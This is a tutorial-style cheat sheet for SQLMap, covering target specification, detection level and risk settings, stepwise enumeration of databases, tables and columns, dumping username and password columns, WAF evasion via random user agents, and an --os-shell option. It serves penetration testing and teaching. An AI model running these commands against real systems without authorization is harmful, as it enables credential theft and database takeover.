# SQLMap: Automated SQL Injection Detection & Exploitation

SQLMap is an open-source penetration testing tool that automates the detection, exploitation, and database takeover of SQL injection vulnerabilities across diverse Database Management Systems (DBMS).

---

## 1. Operating Mechanism & Progressive Workflow

Rather than manually fuzzing injection payloads, SQLMap automates parameter testing, DBMS fingerprinting, schema extraction, and targeted data retrieval:

```text
Target URL / HTTP Request
           │
           ▼
[ Identify Injectable Parameter ]
           │
           ▼
[ Fingerprint DBMS (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) ]
           │
           ▼
[ Enumerate Databases (--dbs) ]
           │
           ▼
[ Enumerate Tables (-D <db> --tables) ]
           │
           ▼
[ Enumerate Columns (-T <table> --columns) ]
           │
           ▼
[ Retrieve / Dump Targeted Data (--dump -C <cols>) ]
```

---

## 2. Target Specification

### 2.1 Testing GET Parameters (`-u`)
```bash
sqlmap -u "https://example.com/page.php?id=7"
```

### 2.2 Testing POST Parameters (`--data`)
```bash
sqlmap -u "https://example.com/login" --data="username=test&password=test" -p username
```

* `-p <param>`: Restricts injection testing to specific named parameters rather than probing all inputs.

---

### 2.3 Testing Saved Burp Suite HTTP Requests (`-r`)
Passing an intercepted HTTP request saved from Burp Suite directly to SQLMap preserves all cookies, headers, authentication tokens, and POST bodies:

```text
Browser ──► Burp Suite Proxy (Capture Request) ──► Save as req.txt ──► sqlmap -r req.txt
```

```bash
sqlmap -r req.txt -p blood_group --dbs
```

---

## 3. Detection Depth & Risk Configuration

| Option | Values | Default | Description |
| :--- | :--- | :--- | :--- |
| `--level` | `1–5` | `1` | Extends testing scope (Level 2 tests HTTP `Cookie` headers; Level 3 tests `User-Agent` and `Referer` headers; Level 5 tests all host headers). |
| `--risk` | `1–3` | `1` | Adjusts invasiveness of test payloads (Risk 2 adds heavy time-based queries; Risk 3 adds `OR`-based tests which may modify database tables). |

---

## 4. Progressive Database Enumeration Hierarchy

SQLMap follows a structured, hierarchical approach to database extraction:

```text
Database (-D)
   └── Table (-T)
         └── Columns (-C)
               └── Dump Data (--dump)
```

### 4.1 Enumerate Databases
```bash
sqlmap -u "https://example.com/page.php?id=7" --dbs
```

### 4.2 Enumerate Tables within a Database
```bash
sqlmap -u "https://example.com/page.php?id=7" -D target_db --tables
```

### 4.3 Enumerate Columns within a Table
```bash
sqlmap -u "https://example.com/page.php?id=7" -D target_db -T users --columns
```

### 4.4 Dump Targeted Column Data
```bash
sqlmap -u "https://example.com/page.php?id=7" -D target_db -T users -C username,password --dump
```

---

## 5. Advanced & Operational Options

| Flag / Option | Purpose / Function | Example |
| :--- | :--- | :--- |
| `--batch` | Non-interactive mode; automatically selects default answers. | `sqlmap -r req.txt --batch` |
| `--proxy` | Routes SQLMap traffic through an HTTP proxy (e.g., Burp Suite). | `--proxy="http://127.0.0.1:8080"` |
| `--random-agent` | Rotates randomized `User-Agent` request headers to evade simple WAF filters. | `--random-agent` |
| `--technique` | Specify injection techniques: `B` (Boolean), `E` (Error), `U` (UNION), `S` (Stacked), `T` (Time), `Q` (Inline). | `--technique=BEU` |
| `--current-db` | Retrieve the name of the database the web application is connected to. | `--current-db` |
| `--current-user` | Retrieve the active database user account. | `--current-user` |
| `--is-dba` | Verify whether the current database user has Administrative (DBA) privileges. | `--is-dba` |
| `--os-shell` | Attempt to establish an interactive OS shell (requires stacked queries / DBA rights). | `--os-shell` |

---

## 6. Key Takeaways

1. **Targeted testing over blind dumping:** Progressively enumerate databases $\rightarrow$ tables $\rightarrow$ columns $\rightarrow$ data rather than running `--dump-all`.
2. **Combine with Burp Suite:** Use `-r req.txt` to test complex, authenticated multipart or JSON requests.
3. **Start with low level/risk:** Begin with default `--level=1 --risk=1` and escalate only when necessary.
4. **Isolate parameters:** Use `-p <param>` to avoid unnecessary requests and speed up testing.
